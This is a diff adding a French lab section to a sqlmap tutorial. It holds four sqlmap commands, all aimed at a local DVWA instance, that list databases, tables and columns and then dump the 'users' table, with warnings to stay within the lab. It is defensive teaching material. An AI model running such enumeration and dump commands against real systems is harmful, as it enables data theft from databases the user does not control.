@@ -57,6 +57,36 @@ Afficher l’aide locale :
 sqlmap --help
 ```
 
+## Séquence complète dans DVWA local
+
+Les commandes suivantes reprennent la progression de la note originale. Elles utilisent exclusivement l’instance DVWA locale. Remplacez uniquement le chemin si votre installation de laboratoire est différente ; ne remplacez pas `127.0.0.1` par un site public.
+
+### 1. Rechercher les bases visibles
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch --level=1 --risk=1
+```
+
+### 2. Lister les tables d’une base de test
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables --batch --level=1 --risk=1
+```
+
+### 3. Lister les colonnes d’une table de test
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --columns --batch --level=1 --risk=1
+```
+
+### 4. Exporter uniquement les données synthétiques du lab
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --dump --batch --level=1 --risk=1
+```
+
+Cette dernière commande peut afficher les comptes de démonstration créés par DVWA. N’utilisez jamais `--dump` sur une base réelle ou sur une cible dont vous n’êtes pas responsable.
+
 ## Correction et vérification
 
 Après avoir remplacé la concaténation par une requête préparée :
